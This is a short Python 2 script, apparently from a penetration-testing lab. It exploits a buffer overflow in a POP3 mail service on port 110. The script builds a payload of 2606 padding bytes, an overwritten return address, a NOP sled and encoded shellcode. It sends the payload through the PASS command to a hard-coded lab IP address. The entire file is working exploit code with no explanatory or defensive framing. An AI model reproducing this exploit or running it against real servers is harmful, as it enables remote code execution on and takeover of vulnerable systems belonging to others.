#!/usr/bin/python2

import socket
import sys

padding = 'A'*2606
eip = '\x8f\x35\x4a\x5f'

buf =  ""
buf += "\xdb\xd2\xd9\x74\x24\xf4\x5b\xba\x17\xeb\xd2\x89\x31"
buf += "\xc9\xb1\x52\x83\xc3\x04\x31\x53\x13\x03\x44\xf8\x30"
buf += "\x7c\x96\x16\x36\x7f\x66\xe7\x57\x09\x83\xd6\x57\x6d"
buf += "\xc0\x49\x68\xe5\x84\x65\x03\xab\x3c\xfd\x61\x64\x33"
buf += "\xb6\xcc\x52\x7a\x47\x7c\xa6\x1d\xcb\x7f\xfb\xfd\xf2"
buf += "\x4f\x0e\xfc\x33\xad\xe3\xac\xec\xb9\x56\x40\x98\xf4"
buf += "\x6a\xeb\xd2\x19\xeb\x08\xa2\x18\xda\x9f\xb8\x42\xfc"
buf += "\x1e\x6c\xff\xb5\x38\x71\x3a\x0f\xb3\x41\xb0\x8e\x15"
buf += "\x98\x39\x3c\x58\x14\xc8\x3c\x9d\x93\x33\x4b\xd7\xe7"
buf += "\xce\x4c\x2c\x95\x14\xd8\xb6\x3d\xde\x7a\x12\xbf\x33"
buf += "\x1c\xd1\xb3\xf8\x6a\xbd\xd7\xff\xbf\xb6\xec\x74\x3e"
buf += "\x18\x65\xce\x65\xbc\x2d\x94\x04\xe5\x8b\x7b\x38\xf5"
buf += "\x73\x23\x9c\x7e\x99\x30\xad\xdd\xf6\xf5\x9c\xdd\x06"
buf += "\x92\x97\xae\x34\x3d\x0c\x38\x75\xb6\x8a\xbf\x7a\xed"
buf += "\x6b\x2f\x85\x0e\x8c\x66\x42\x5a\xdc\x10\x63\xe3\xb7"
buf += "\xe0\x8c\x36\x17\xb0\x22\xe9\xd8\x60\x83\x59\xb1\x6a"
buf += "\x0c\x85\xa1\x95\xc6\xae\x48\x6c\x81\xda\x87\x6e\x95"
buf += "\xb3\x95\x6e\x14\xff\x13\x88\x7c\xef\x75\x03\xe9\x96"
buf += "\xdf\xdf\x88\x57\xca\x9a\x8b\xdc\xf9\x5b\x45\x15\x77"
buf += "\x4f\x32\xd5\xc2\x2d\x95\xea\xf8\x59\x79\x78\x67\x99"
buf += "\xf4\x61\x30\xce\x51\x57\x49\x9a\x4f\xce\xe3\xb8\x8d"
buf += "\x96\xcc\x78\x4a\x6b\xd2\x81\x1f\xd7\xf0\x91\xd9\xd8"
buf += "\xbc\xc5\xb5\x8e\x6a\xb3\x73\x79\xdd\x6d\x2a\xd6\xb7"
buf += "\xf9\xab\x14\x08\x7f\xb4\x70\xfe\x9f\x05\x2d\x47\xa0"
buf += "\xaa\xb9\x4f\xd9\xd6\x59\xaf\x30\x53\x79\x52\x90\xae"
buf += "\x12\xcb\x71\x13\x7f\xec\xac\x50\x86\x6f\x44\x29\x7d"
buf += "\x6f\x2d\x2c\x39\x37\xde\x5c\x52\xd2\xe0\xf3\x53\xf7"

shellcode = buf
nops = '\x90' * 16          # we need to NOPs because those can be sacrificed by the shellcode decoders stack operations
payload = padding + eip + nops + shellcode + "C" * (3500-len(padding)-len(eip)-len(nops)-len(shellcode))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.11.11.142', 110))
data = s.recv(1024)
print "Received: ", data
s.send('USER test\r\n')
print s.recv(1024)
s.send('PASS ' + payload + '\r\n')


